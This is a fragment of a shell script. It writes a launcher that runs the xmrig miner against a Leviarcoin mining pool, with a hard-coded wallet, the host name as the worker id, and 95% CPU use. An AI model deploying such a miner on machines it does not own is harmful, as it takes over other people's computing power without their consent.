...
{
echo "#!/bin/bash"
echo " screen ./xmrig -o pool.leviarcoin.hashvault.pro:8888 -u LtMig6TakmafkL6THtiN9TCB96yRhK3rUgsdsCPGqhoU6DvrwkU6fDgS9mbSqfmsYG3MG5nBH5SLXJMx3qLx8RAf1KSWaNk -p $(hostname):mining@secrectvn.com-k --max-cpu-usage=95 --donate-level=1 "
} >> ~/leviarcoin.sh ;
